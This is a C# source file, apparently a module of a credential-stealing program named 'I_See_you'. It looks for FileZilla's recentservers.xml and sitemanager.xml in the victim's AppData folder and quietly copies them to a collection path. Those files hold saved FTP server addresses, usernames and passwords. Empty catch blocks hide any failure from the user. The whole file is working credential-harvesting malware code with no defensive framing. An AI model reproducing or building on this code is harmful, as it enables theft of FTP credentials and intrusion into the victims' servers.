using System;
using System.IO;
namespace I_See_you
{
    class FilezillaFTP
    {
        internal class FileZilla
        {
            public static void Initialise(string path)
            {
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml"))
                {
                    return;
                }
                try
                {
                    File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml", path + "filezilla_recentservers.xml", true);
                }
                catch
                {
                }
                if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml"))
                {
                    return;
                }
                try
                {
                    File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml", path + "filezilla_sitemanager.xml", true);
                }
                catch
                {
                }
            }
        }
    }
}
